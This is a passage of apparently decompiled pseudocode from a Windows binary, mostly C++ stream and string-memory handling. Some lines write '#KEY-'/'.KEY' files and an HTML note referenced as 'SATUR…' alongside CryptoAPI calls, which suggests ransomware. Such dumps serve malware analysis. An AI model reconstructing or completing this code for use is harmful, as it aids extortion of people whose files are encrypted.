          *(_DWORD *)((char *)&v151[47] + *(_DWORD *)(v152[0] + 4)) = *(_DWORD *)(v152[0] + 4) - 104;
          sub_40C000(&v152[1]);
          v152[1] = &std::filebuf::`vftable';
          sub_40B9B0((int)&v152[1], 0, 0);
          LOBYTE(v195) = 33;
          v61 = (char *)v178;
          v136 = (int)v62;
          if ( v180 >= 0x10 )
            v61 = v178[0];
          v63 = sub_40BB70(&v152[1], v61, 2, v136) == 0;
          v136 = 0;
          v64 = *(_DWORD *)(v152[0] + 4);
          if ( v63 )
          {
            v65 = (char *)v152 + v64;
            v64 = *(_DWORD *)((char *)&v152[3] + v64) | 6;
            if ( *((_DWORD *)v65 + 14) )
              v64 = *((_DWORD *)v65 + 3) | 2;
            v66 = v65;
          }
          else
          {
            v66 = (_DWORD *)((char *)v152 + v64);
            LOBYTE(v64) = 4;
            if ( v66[14] )
              LOBYTE(v64) = 0;
          }
          sub_4043E0(v66, v64, v136);
          v67 = &v158;
          v136 = (int)v159;
          if ( v160 >= 0x10 )
            v67 = v158;
          sub_40C920((char *)v152, (int)v67, v136);
          if ( !sub_40BAB0((int)&v152[1]) )
          {
            v136 = 0;
            v68 = (char *)v152 + *(_DWORD *)(v152[0] + 4);
            v69 = *((_DWORD *)v68 + 3) | 6;
            if ( *((_DWORD *)v68 + 14) )
              v69 = *((_DWORD *)v68 + 3) | 2;
            sub_4043E0((_DWORD *)((char *)v152 + *(_DWORD *)(v152[0] + 4)), v69, v136);
          }
          memset(v150, 0, sizeof(v150));
          p_st_atime = (char *)&v153.st_atime;
          if ( HIDWORD(v153.st_ctime) >= 0x10 )
            p_st_atime = (char *)v153.st_atime;
          sub_40B670(v150, p_st_atime, 32, (int)v135, v136);
          *(_DWORD *)((char *)v150 + *(_DWORD *)(v150[0] + 4)) = &std::ofstream::`vftable';
          *(_DWORD *)((char *)&v150[-1] + *(_DWORD *)(v150[0] + 4)) = *(_DWORD *)(v150[0] + 4) - 104;
          LOBYTE(v195) = 34;
          sub_40A8D0((char *)v150, (int)aHtmlTitleSATUR, 983i64);
          if ( !sub_40BAB0((int)&v150[1]) )
          {
            v136 = 0;
            v71 = (char *)v150 + *(_DWORD *)(v150[0] + 4);
            v72 = *((_DWORD *)v71 + 3) | 6;
            if ( *((_DWORD *)v71 + 14) )
              v72 = *((_DWORD *)v71 + 3) | 2;
            sub_4043E0((_DWORD *)((char *)v150 + *(_DWORD *)(v150[0] + 4)), v72, v136);
          }
          operator new(1u);
          v73 = &a10;
          v137[7] = &v134;
          v148 = (unsigned int)&v134;
          v135 = 0;
          v136 = 0;
          if ( a15 >= 0x10 )
            v73 = (unsigned int *)a10;
          v146 = (char *)a14;
          v144 = v73;
          if ( a14 >= 0x10 )
          {
            v74 = a14 | 0xF;
            if ( (a14 | 0xF) > 0x7FFFFFFF )
              v74 = 0x7FFFFFFF;
            v145 = (const void *)v74;
            v75 = sub_401C70(v74 + 1);
            *(_DWORD *)v148 = v75;
            memmove_0(v75, v144, (size_t)(v146 + 1));
            v76 = v148;
            *(_DWORD *)(v148 + 16) = v146;
            *(_DWORD *)(v76 + 20) = v145;
          }
          else
          {
            v134 = *(_OWORD *)v73;
            v135 = (LPCSTR)a14;
            v136 = 15;
          }
          LOBYTE(v195) = 36;
          v138[4] = 0;
          v149 |= 0x800u;
          v147 = v149;
          v139 = 15;
          LOBYTE(v138[0]) = 0;
          sub_40C620(v138, v169 + 6);
          v77 = v168;
          v133 = v169;
          if ( v170 >= 0x10 )
            v77 = (_DWORD *)v168[0];
          sub_4036D0(v138, v77, v133);
          sub_4036D0(v138, "\\#KEY-", 6u);
          v78 = &a10;
          v133 = a14;
          if ( a15 >= 0x10 )
            v78 = (unsigned int *)a10;
          v79 = sub_4036D0(v138, v78, v133);
          v143 = 0i64;
          v142 = *(_OWORD *)v79;
          v143 = *((_QWORD *)v79 + 2);
          v79[4] = 0;
          v79[5] = (char *)15;
          *(_BYTE *)v79 = 0;
          v149 |= 0x1000u;
          v147 = v149;
          LOBYTE(v195) = 37;
          v137[6] = v132;
          v140 = v132;
          v80 = sub_4036D0((char **)&v142, ".KEY", 4u);
          v81 = v140;
          v140[4] = 0;
          v81[5] = 0;
          *(_OWORD *)v81 = *(_OWORD *)v80;
          *((_QWORD *)v81 + 2) = *((_QWORD *)v80 + 2);
          v82 = v149 | 0x2000;
          v80[4] = 0;
          v80[5] = (char *)15;
          *(_BYTE *)v80 = 0;
          v149 = v82;
          v147 = v82;
          LOBYTE(v195) = 38;
          v83 = &a4;
          v146 = (char *)&v129;
          v130 = 0;
          v131 = 0;
          v148 = a8;
          if ( a9 >= 0x10 )
            v83 = (unsigned int *)a4;
          v145 = v83;
          if ( a8 >= 0x10 )
          {
            v84 = a8 | 0xF;
            if ( (a8 | 0xF) > 0x7FFFFFFF )
              v84 = 0x7FFFFFFF;
            v144 = (unsigned int *)v84;
            v85 = sub_401C70(v84 + 1);
            *(_DWORD *)v146 = v85;
            memmove_0(v85, v145, v148 + 1);
            v86 = v146;
            *((_DWORD *)v146 + 4) = v148;
            *((_DWORD *)v86 + 5) = v144;
          }
          else
          {
            v129 = *(_OWORD *)v83;
            v130 = a8;
            v131 = 15;
          }
          LOBYTE(v195) = 40;
          sub_407400(
            (int)v196,
            (_DWORD *)v129,
            SDWORD1(v129),
            SDWORD2(v129),
            SHIDWORD(v129),
            v130,
            v131,
            v132[0],
            (int)v132[1],
            (int)v132[2],
            (int)v132[3],
            (int)v132[4],
            v133,
            (char *)v134,
            SDWORD1(v134),
            SDWORD2(v134),
            SHIDWORD(v134),
            (int)v135,
            v136);
          LOBYTE(v195) = 39;
          if ( HIDWORD(v143) >= 0x10 )
          {
            v87 = (void *)v142;
            if ( (unsigned int)(HIDWORD(v143) + 1) >= 0x1000 )
            {
              if ( (v142 & 0x1F) != 0 )
                goto LABEL_16;
              v88 = *(_DWORD *)(v142 - 4);
              if ( v88 >= (unsigned int)v142 || (unsigned int)v142 - v88 < 4 || (unsigned int)v142 - v88 > 0x23 )
                goto LABEL_16;
              v87 = *(void **)(v142 - 4);
            }
            j__free(v87);
          }
          v149 &= ~0x800u;
          LOBYTE(v195) = 34;
          v143 = 0xF00000000i64;
          LOBYTE(v142) = 0;
          if ( v139 >= 0x10 )
          {
            v89 = v138[0];
            if ( v139 + 1 >= 0x1000 )
            {
              if ( ((int)v138[0] & 0x1F) != 0 )
                goto LABEL_16;
              v90 = (char *)*((_DWORD *)v138[0] - 1);
              if ( v90 >= v138[0] || (unsigned int)(v138[0] - v90) < 4 || (unsigned int)(v138[0] - v90) > 0x23 )
                goto LABEL_16;
              v89 = (char *)*((_DWORD *)v138[0] - 1);
            }
            j__free(v89);
          }
          *(_DWORD *)((char *)v150 + *(_DWORD *)(v150[0] + 4)) = &std::ofstream::`vftable';
          *(_DWORD *)((char *)&v150[-1] + *(_DWORD *)(v150[0] + 4)) = *(_DWORD *)(v150[0] + 4) - 104;
          sub_40A7C0(&v150[1]);
          *(_DWORD *)((char *)v150 + *(_DWORD *)(v150[0] + 4)) = &std::ostream::`vftable';
          *(_DWORD *)((char *)&v150[-1] + *(_DWORD *)(v150[0] + 4)) = *(_DWORD *)(v150[0] + 4) - 8;
          LOBYTE(v195) = 41;
          v150[26] = &std::ios_base::`vftable';
          std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v150[26]);
          *(_DWORD *)((char *)v152 + *(_DWORD *)(v152[0] + 4)) = &std::ofstream::`vftable';
          *(_DWORD *)((char *)&v151[47] + *(_DWORD *)(v152[0] + 4)) = *(_DWORD *)(v152[0] + 4) - 104;
          sub_40A7C0(&v152[1]);
          *(_DWORD *)((char *)v152 + *(_DWORD *)(v152[0] + 4)) = &std::ostream::`vftable';
          *(_DWORD *)((char *)&v151[47] + *(_DWORD *)(v152[0] + 4)) = *(_DWORD *)(v152[0] + 4) - 8;
          LOBYTE(v195) = 42;
          v152[26] = &std::ios_base::`vftable';
          std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v152[26]);
          LOBYTE(v195) = 28;
          if ( HIDWORD(v153.st_ctime) >= 0x10 )
          {
            v91 = (void *)v153.st_atime;
            if ( (unsigned int)(HIDWORD(v153.st_ctime) + 1) >= 0x1000 )
            {
              if ( (v153.st_atime & 0x1F) != 0 )
                goto LABEL_16;
              v92 = *(_DWORD *)(LODWORD(v153.st_atime) - 4);
              if ( v92 >= LODWORD(v153.st_atime)
                || LODWORD(v153.st_atime) - v92 < 4
                || LODWORD(v153.st_atime) - v92 > 0x23 )
              {
                goto LABEL_16;
              }
              v91 = *(void **)(LODWORD(v153.st_atime) - 4);
            }
            j__free(v91);
          }
          v195 = 27;
        }
        LOBYTE(v195) = 26;
        if ( v180 >= 0x10 )
        {
          v93 = v178[0];
          if ( v180 + 1 >= 0x1000 )
          {
            if ( ((int)v178[0] & 0x1F) != 0 )
              goto LABEL_16;
            v94 = (char *)*((_DWORD *)v178[0] - 1);
            if ( v94 >= v178[0] || (unsigned int)(v178[0] - v94) < 4 || (unsigned int)(v178[0] - v94) > 0x23 )
              goto LABEL_16;
            v93 = (char *)*((_DWORD *)v178[0] - 1);
          }
          j__free(v93);
        }
        LOBYTE(v195) = 25;
        v179 = 0;
        v180 = 15;
        LOBYTE(v178[0]) = 0;
        if ( v170 >= 0x10 )
        {
          v95 = (void *)v168[0];
          if ( v170 + 1 >= 0x1000 )
          {
            if ( (v168[0] & 0x1F) != 0 )
              goto LABEL_16;
            v96 = *(_DWORD *)(v168[0] - 4);
            if ( v96 >= v168[0] || v168[0] - v96 < 4 || v168[0] - v96 > 0x23 )
              goto LABEL_16;
            v95 = *(void **)(v168[0] - 4);
          }
          j__free(v95);
        }
        v169 = 0;
        v170 = 15;
        LOBYTE(v168[0]) = 0;
        sub_409B60(v151);
      }
      LOBYTE(v195) = 18;
      if ( HIDWORD(v175) >= 0x10 )
      {
        v99 = (void *)v174;
        if ( (unsigned int)(HIDWORD(v175) + 1) >= 0x1000 )
        {
          if ( (v174 & 0x1F) != 0 )
            goto LABEL_16;
          v100 = *(_DWORD *)(v174 - 4);
          if ( v100 >= (unsigned int)v174 || (unsigned int)v174 - v100 < 4 || (unsigned int)v174 - v100 > 0x23 )
            goto LABEL_16;
          v99 = *(void **)(v174 - 4);
        }
        j__free(v99);
      }
      LOBYTE(v195) = 15;
      v175 = 0xF00000000i64;
      LOBYTE(v174) = 0;
      if ( HIDWORD(v172) >= 0x10 )
      {
        v101 = (void *)v171;
        if ( (unsigned int)(HIDWORD(v172) + 1) >= 0x1000 )
        {
          if ( (v171 & 0x1F) != 0 )
            goto LABEL_16;
          v102 = *(_DWORD *)(v171 - 4);
          if ( v102 >= (unsigned int)v171 || (unsigned int)v171 - v102 < 4 || (unsigned int)v171 - v102 > 0x23 )
            goto LABEL_16;
          v101 = *(void **)(v171 - 4);
        }
        j__free(v101);
      }
      LOBYTE(v195) = 13;
      v172 = 0xF00000000i64;
      LOBYTE(v171) = 0;
      if ( v187 >= 0x10 )
      {
        v103 = v185[0];
        if ( v187 + 1 >= 0x1000 )
        {
          if ( ((int)v185[0] & 0x1F) != 0 )
            goto LABEL_16;
          v104 = (char *)*((_DWORD *)v185[0] - 1);
          if ( v104 >= v185[0] || (unsigned int)(v185[0] - v104) < 4 || (unsigned int)(v185[0] - v104) > 0x23 )
            goto LABEL_16;
          v103 = (char *)*((_DWORD *)v185[0] - 1);
        }
        j__free(v103);
      }
      v27 = (const CHAR *)v188;
    }
    LOBYTE(v195) = 12;
    if ( v27 )
    {
      v136 = (int)v27;
      sub_4038C0((int)v27, SHIDWORD(v188));
      v105 = (void *)v188;
      v106 = (v189 - (int)v188) / 24;
      if ( v106 > 0xAAAAAAA )
        goto LABEL_16;
      if ( 24 * v106 >= 0x1000 )
      {
        if ( (v188 & 0x1F) != 0 )
          goto LABEL_16;
        v107 = *(_DWORD *)(v188 - 4);
        if ( v107 >= (unsigned int)v188 || (unsigned int)v188 - v107 < 4 || (unsigned int)v188 - v107 > 0x23 )
          goto LABEL_16;
        v105 = *(void **)(v188 - 4);
      }
      j__free(v105);
      v188 = 0i64;
      v189 = 0;
    }
    LOBYTE(v195) = 11;
    if ( v183 >= 0x10 )
    {
      v108 = (void *)v181;
      if ( v183 + 1 >= 0x1000 )
      {
        if ( (v181 & 0x1F) != 0 )
          goto LABEL_16;
        v109 = *(_DWORD *)(v181 - 4);
        if ( v109 >= (unsigned int)v181 || (unsigned int)v181 - v109 < 4 || (unsigned int)v181 - v109 > 0x23 )
          goto LABEL_16;
        v108 = *(void **)(v181 - 4);
      }
      j__free(v108);
    }
    v15 = v149;
  }
  sub_409D90((int *)&v176);
  if ( v167[0] && !CryptReleaseContext(v167[0], 0) )
  {
    LastError = GetLastError();
    v136 = (int)"An error occurred in the program. \n";
    v111 = (const CHAR *)LastError;
    v112 = __acrt_iob_func(2u);
    sub_401FF0((int)v112, v136);
    v136 = (int)"Error during CryptReleaseContext!\n";
    v135 = "%s\n";
    v113 = __acrt_iob_func(2u);
    sub_401FF0((int)v113, (int)v135);
    v136 = (int)v111;
    v135 = "Error number %x.\n";
    v114 = __acrt_iob_func(2u);
    sub_401FF0((int)v114, (int)v135);
  }
  if ( v166 >= 0x10 )
  {
    v115 = (void *)v164[0];
    if ( v166 + 1 >= 0x1000 )
    {
      if ( (v164[0] & 0x1F) != 0 )
        goto LABEL_16;
      v116 = *(_DWORD *)(v164[0] - 4);
      if ( v116 >= v164[0] || v164[0] - v116 < 4 || v164[0] - v116 > 0x23 )
        goto LABEL_16;
      v115 = *(void **)(v164[0] - 4);
    }
    j__free(v115);
  }
  v165 = 0;
  v166 = 15;
  LOBYTE(v164[0]) = 0;
  if ( v155 >= 0x10 )
  {
    v117 = (void *)v154[0];
    if ( v155 + 1 >= 0x1000 )
    {
      if ( (v154[0] & 0x1F) != 0 )
        goto LABEL_16;
      v118 = *(_DWORD *)(v154[0] - 4);
      if ( v118 >= v154[0] || v154[0] - v118 < 4 || v154[0] - v118 > 0x23 )
        goto LABEL_16;
      v117 = *(void **)(v154[0] - 4);
    }
    j__free(v117);
  }
  v154[4] = 0;
  v155 = 15;
  LOBYTE(v154[0]) = 0;
  if ( v157 >= 0x10 )
  {
    v119 = (void *)v156[0];
    if ( v157 + 1 >= 0x1000 )
    {
      if ( (v156[0] & 0x1F) != 0 )
        goto LABEL_16;
      v120 = *(_DWORD *)(v156[0] - 4);
      if ( v120 >= v156[0] || v156[0] - v120 < 4 || v156[0] - v120 > 0x23 )
        goto LABEL_16;
      v119 = *(void **)(v156[0] - 4);
    }
    j__free(v119);
  }
  v156[4] = 0;
  v157 = 15;
  LOBYTE(v156[0]) = 0;
  if ( v163 >= 0x10 )
  {
    v121 = (void *)v161[0];
    if ( v163 + 1 >= 0x1000 )
    {
      if ( (v161[0] & 0x1F) != 0 )
        goto LABEL_16;
      v122 = *(_DWORD *)(v161[0] - 4);
      if ( v122 >= v161[0] || v161[0] - v122 < 4 || v161[0] - v122 > 0x23 )
        goto LABEL_16;
      v121 = *(void **)(v161[0] - 4);
    }
    j__free(v121);
  }
  v162 = 0;
  v163 = 15;
  LOBYTE(v161[0]) = 0;
  if ( v160 >= 0x10 )
  {
    v123 = v158;
    if ( v160 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)v158 & 0x1F) != 0 )
        goto LABEL_16;
      v124 = *(v158 - 1);
      if ( v124 >= (unsigned int)v158 || (unsigned int)v158 - v124 < 4 || (unsigned int)v158 - v124 > 0x23 )
        goto LABEL_16;
      v123 = (void *)*(v158 - 1);
    }
    j__free(v123);
  }
  v159 = 0;
  v160 = 15;
  LOBYTE(v158) = 0;
  if ( a9 >= 0x10 )
  {
    v125 = (void *)a4;
    if ( a9 + 1 >= 0x1000 )
    {
      if ( (a4 & 0x1F) != 0 )
        goto LABEL_16;
      v126 = *(_DWORD *)(a4 - 4);
      if ( v126 >= a4 || a4 - v126 < 4 || a4 - v126 > 0x23 )
        goto LABEL_16;
      v125 = *(void **)(a4 - 4);
    }
    j__free(v125);
  }
  a8 = 0;
  a9 = 15;
  LOBYTE(a4) = 0;
  if ( a15 < 0x10 )
    return;
  v127 = (void *)a10;
  if ( a15 + 1 >= 0x1000 )
  {
    if ( (a10 & 0x1F) == 0 )
    {
      v128 = *(_DWORD *)(a10 - 4);
      if ( v128 < a10 && a10 - v128 >= 4 && a10 - v128 <= 0x23 )
      {
        v127 = *(void **)(a10 - 4);
        goto LABEL_282;
      }
    }
LABEL_16:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_282:
  j__free(v127);
}
// 4082E0: could not find valid save-restore pair for ebp
// 4082E0: could not find valid save-restore pair for edi
// 4082E0: could not find valid save-restore pair for esi
// 408B54: variable 'v50' is possibly undefined
// 408DBA: variable 'v62' is possibly undefined
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436028: using guessed type void *std::filebuf::`vftable';
// 436068: using guessed type void *std::ios::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442330: using guessed type void *std::ofstream::`vftable';
// 442340: using guessed type void *std::fstream::`vftable';

//----- (00409B60) --------------------------------------------------------
void __thiscall sub_409B60(_DWORD *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 30);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 120) = &std::fstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 124) = *(_DWORD *)(*this + 4) - 120;
  sub_40A7C0(this + 6);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 30) + 4) - 120) = &std::iostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 30) + 4) - 124) = *(_DWORD *)(*((_DWORD *)v1 - 30) + 4) - 32;
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 8;
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 30) + 4) - 120) = &std::istream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 30) + 4) - 124) = *(_DWORD *)(*((_DWORD *)v1 - 30) + 4) - 24;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442338: using guessed type void *std::iostream::`vftable';
// 442340: using guessed type void *std::fstream::`vftable';
// 442350: using guessed type void *std::istream::`vftable';

//----- (00409C20) --------------------------------------------------------
int *__thiscall sub_409C20(int *this, int a2)
{
  int *result; // eax
  int v3; // esi
  int v4; // ecx
  int v5; // ebx
  int v6; // eax
  unsigned int v7; // esi
  unsigned int v8; // esi
  _DWORD *v9; // ebx
  unsigned int v10; // eax
  void *v11; // eax
  int v12; // ecx
  int v13; // [esp+10h] [ebp-Ch]
  int *v14; // [esp+14h] [ebp-8h]
  int v15; // [esp+18h] [ebp-4h]

  result = this;
  v3 = this[2];
  v4 = this[1];
  v14 = result;
  if ( v3 == v4 )
  {
    v5 = *result;
    v6 = (v4 - *result) / 24;
    v15 = v6;
    if ( v6 == 178956970 )
      sub_4035D0();
    v13 = v6 + 1;
    v7 = (v3 - v5) / 24;
    if ( v7 <= 178956970 - (v7 >> 1) )
    {
      v8 = (v7 >> 1) + v7;
      if ( v8 < v6 + 1 )
        v8 = v6 + 1;
    }
    else
    {
      v8 = v6 + 1;
    }
    if ( v8 )
    {
      if ( v8 > 0xAAAAAAA )
        sub_415388();
      v10 = 24 * v8;
      if ( 24 * v8 < 0x1000 )
      {
        v9 = operator new(24 * v8);
      }
      else
      {
        if ( v10 + 35 <= v10 )
          sub_415388();
        v11 = operator new(v10 + 35);
        v9 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
        *(v9 - 1) = v11;
      }
    }
    else
    {
      v9 = 0;
    }
    v12 = 3 * v15;
    v9[2 * v12 + 4] = 0;
    v9[2 * v12 + 5] = 0;
    *(_OWORD *)&v9[2 * v12] = *(_OWORD *)a2;
    *(_QWORD *)&v9[2 * v12 + 4] = *(_QWORD *)(a2 + 16);
    *(_DWORD *)(a2 + 16) = 0;
    *(_DWORD *)(a2 + 20) = 15;
    *(_BYTE *)a2 = 0;
    sub_403930(*v14, v14[1], (int)v9);
    return (int *)sub_4035E0(v14, (int)v9, v13, v8);
  }
  else
  {
    *(_DWORD *)(v4 + 16) = 0;
    *(_DWORD *)(v4 + 20) = 0;
    *(_OWORD *)v4 = *(_OWORD *)a2;
    *(_QWORD *)(v4 + 16) = *(_QWORD *)(a2 + 16);
    *(_DWORD *)(a2 + 16) = 0;
    *(_DWORD *)(a2 + 20) = 15;
    *(_BYTE *)a2 = 0;
    result[1] += 24;
  }
  return result;
}

//----- (00409D90) --------------------------------------------------------
void __thiscall sub_409D90(int *this)
{
  int v2; // ecx
  _BYTE *v3; // ebx
  unsigned int v4; // eax
  _BYTE *v5; // eax
  unsigned int v6; // ebx

  v2 = *this;
  if ( v2 )
  {
    sub_4038C0(v2, this[1]);
    v3 = (_BYTE *)*this;
    v4 = (this[2] - *this) / 24;
    if ( v4 <= 0xAAAAAAA )
    {
      if ( 24 * v4 < 0x1000 )
      {
LABEL_9:
        j__free(v3);
        *this = 0;
        this[1] = 0;
        this[2] = 0;
        return;
      }
      if ( ((unsigned __int8)v3 & 0x1F) == 0 )
      {
        v5 = (_BYTE *)*((_DWORD *)v3 - 1);
        if ( v5 < v3 )
        {
          v6 = v3 - v5;
          if ( v6 >= 4 && v6 <= 0x23 )
          {
            v3 = v5;
            goto LABEL_9;
          }
        }
      }
    }
    _invalid_parameter_noinfo_noreturn();
  }
}

//----- (00409E40) --------------------------------------------------------
char **__thiscall sub_409E40(char **this, size_t Size, char a3)
{
  unsigned int v4; // ecx
  char **v5; // ebx
  size_t v7; // ebx
  char *v8; // eax
  char *v9; // ebx
  char *v10; // ecx
  char *v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // [esp+Ch] [ebp-8h]
  void *v14; // [esp+10h] [ebp-4h]

  this[4] = 0;
  this[5] = (char *)15;
  *(_BYTE *)this = 0;
  v4 = (unsigned int)this[5];
  v13 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_401F10();
    v7 = 0x7FFFFFFF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v14 = (void *)(v4 >> 1);
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        v7 = Size | 0xF;
        if ( (Size | 0xF) < (unsigned int)v14 + v4 )
          v7 = (size_t)v14 + v4;
      }
    }
    v8 = (char *)sub_401C70(__CFADD__(v7, 1) ? -1 : v7 + 1);
    this[5] = (char *)v7;
    v9 = v8;
    this[4] = (char *)Size;
    memset(v8, a3, Size);
    v9[Size] = 0;
    if ( v13 >= 0x10 )
    {
      v10 = *this;
      if ( v13 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v10 & 0x1F) != 0
          || (v11 = (char *)*((_DWORD *)v10 - 1), v11 >= v10)
          || (v12 = v10 - v11, v12 < 4)
          || v12 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v10 = v11;
      }
      j__free(v10);
    }
    *this = v9;
    return this;
  }
  else
  {
    v5 = this;
    if ( v4 >= 0x10 )
      v5 = (char **)*this;
    this[4] = (char *)Size;
    memset(v5, a3, Size);
    *((_BYTE *)v5 + Size) = 0;
    return this;
  }
}

//----- (00409F50) --------------------------------------------------------
_DWORD *__thiscall sub_409F50(_DWORD *this, int a2)
{
  _DWORD *v3; // eax

  v3 = sub_40C4D0(a2);
  return sub_40B7B0(this, (int)v3);
}

//----- (00409F70) --------------------------------------------------------
int __thiscall sub_409F70(FILE **this)
{
  if ( !this[19] || ((int (__thiscall *)(FILE **, int))(*this)->_flag)(this, -1) == -1 || fflush(this[19]) >= 0 )
    return 0;
  else
    return -1;
}

//----- (00409FA0) --------------------------------------------------------
FILE **__thiscall sub_409FA0(FILE **this, char *Buffer, __int64 Size)
{
  FILE *v4; // ecx
  int v5; // eax

  v4 = this[19];
  if ( !v4 )
    return 0;
  v5 = Buffer || Size ? 0 : 4;
  if ( setvbuf(v4, Buffer, v5, Size) )
    return 0;
  sub_40B9B0((int)this, this[19], 1);
  return this;
}

//----- (00409FF0) --------------------------------------------------------
int __thiscall sub_409FF0(int this, int a2, __int64 Offset, fpos_t a4, int a5, int a6, int a7)
{
  int v8; // edx
  int v9; // esi
  int v10; // ecx
  fpos_t Position; // [esp+10h] [ebp-10h] BYREF

  Position = a4;
  if ( !*(_DWORD *)(this + 76)
    || !sub_40B840((char *)this)
    || fsetpos(*(FILE **)(this + 76), &Position)
    || Offset && _fseeki64(*(FILE **)(this + 76), Offset, 1)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    *(_DWORD *)(this + 64) = a5;
    *(_DWORD *)(this + 68) = a6;
    std::filebuf::_Reset_back(this);
    v8 = *(_DWORD *)(this + 64);
    v9 = *(_DWORD *)(this + 68);
    *(_DWORD *)(a2 + 8) = Position;
    v10 = HIDWORD(Position);
    *(_DWORD *)a2 = 0;
    *(_DWORD *)(a2 + 4) = 0;
    *(_DWORD *)(a2 + 12) = v10;
    *(_DWORD *)(a2 + 16) = v8;
    *(_DWORD *)(a2 + 20) = v9;
  }
  return a2;
}
// 40B780: using guessed type int __thiscall std::filebuf::_Reset_back(_DWORD);

//----- (0040A100) --------------------------------------------------------
int __thiscall sub_40A100(int this, int a2, __int64 a3, int Origin, int a5)
{
  unsigned int v6; // eax
  unsigned int v7; // ebx
  _DWORD *v8; // eax
  int v9; // ecx
  int v10; // edx
  int v11; // edx
  int v12; // esi
  int v13; // ecx
  unsigned int v15; // [esp+Ch] [ebp-14h]
  fpos_t Position; // [esp+10h] [ebp-10h] BYREF

  if ( **(_DWORD **)(this + 28) == this + 60 && Origin == 1 && !*(_DWORD *)(this + 56) )
  {
    v6 = (unsigned __int64)(a3 - 1) >> 32;
    v7 = a3 - 1;
  }
  else
  {
    v6 = HIDWORD(a3);
    v7 = a3;
  }
  v15 = v6;
  if ( !*(_DWORD *)(this + 76)
    || !sub_40B840((char *)this)
    || (__PAIR64__(v7, v15) || Origin != 1) && _fseeki64(*(FILE **)(this + 76), __SPAIR64__(v15, v7), Origin)
    || fgetpos(*(FILE **)(this + 76), &Position) )
  {
    *(_DWORD *)a2 = -1;
    *(_DWORD *)(a2 + 4) = -1;
    *(_DWORD *)(a2 + 8) = 0;
    *(_DWORD *)(a2 + 12) = 0;
    *(_QWORD *)(a2 + 16) = 0i64;
  }
  else
  {
    v8 = *(_DWORD **)(this + 12);
    if ( *v8 == this + 60 )
    {
      v9 = *(_DWORD *)(this + 80);
      v10 = *(_DWORD *)(this + 84) - v9;
      *v8 = v9;
      **(_DWORD **)(this + 28) = v9;
      **(_DWORD **)(this + 44) = v10;
    }
    v11 = *(_DWORD *)(this + 64);
    v12 = *(_DWORD *)(this + 68);
    *(_DWORD *)(a2 + 8) = Position;
    v13 = HIDWORD(Position);
    *(_DWORD *)a2 = 0;
    *(_DWORD *)(a2 + 4) = 0;
    *(_DWORD *)(a2 + 12) = v13;
    *(_DWORD *)(a2 + 16) = v11;
    *(_DWORD *)(a2 + 20) = v12;
  }
  return a2;
}

//----- (0040A220) --------------------------------------------------------
int __thiscall sub_40A220(int this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // edx
  _DWORD *v4; // ecx
  unsigned __int8 *v5; // edx
  int result; // eax
  _DWORD *v7; // esi
  int v8; // ecx
  int v9; // edx
  int i; // eax
  void **v11; // edi
  void **v12; // esi
  int v13; // eax
  void **v14; // eax
  char *v15; // ecx
  int v16; // esi
  void **v17; // eax
  void **v18; // ecx
  unsigned int v19; // edi
  unsigned int v20; // eax
  char *v21; // eax
  unsigned int v22; // ecx
  int v23; // edx
  int v24; // esi
  int v25; // eax
  char *v26; // [esp+10h] [ebp-34h] BYREF
  int v27; // [esp+14h] [ebp-30h] BYREF
  void *Block[4]; // [esp+18h] [ebp-2Ch] BYREF
  unsigned int v29; // [esp+28h] [ebp-1Ch]
  unsigned int v30; // [esp+2Ch] [ebp-18h]
  unsigned __int8 v31; // [esp+33h] [ebp-11h] BYREF
  int v32[4]; // [esp+34h] [ebp-10h] BYREF

  v2 = **(_DWORD **)(this + 28);
  if ( v2 )
  {
    v3 = *(_DWORD **)(this + 44);
    if ( v2 < *v3 + v2 )
    {
      --*v3;
      v4 = *(_DWORD **)(this + 28);
      v5 = (unsigned __int8 *)(*v4)++;
      return *v5;
    }
  }
  if ( !*(_DWORD *)(this + 76) )
    return -1;
  v7 = *(_DWORD **)(this + 12);
  if ( *v7 == this + 60 )
  {
    v8 = *(_DWORD *)(this + 80);
    v9 = *(_DWORD *)(this + 84) - v8;
    *v7 = v8;
    **(_DWORD **)(this + 28) = v8;
    **(_DWORD **)(this + 44) = v9;
  }
  if ( *(_DWORD *)(this + 56) )
  {
    v29 = 0;
    v30 = 15;
    LOBYTE(Block[0]) = 0;
    v32[3] = 0;
    for ( i = fgetc(*(FILE **)(this + 76)); i != -1; i = fgetc(*(FILE **)(this + 76)) )
    {
      sub_40B500((char **)Block, 1u, i);
      v11 = Block;
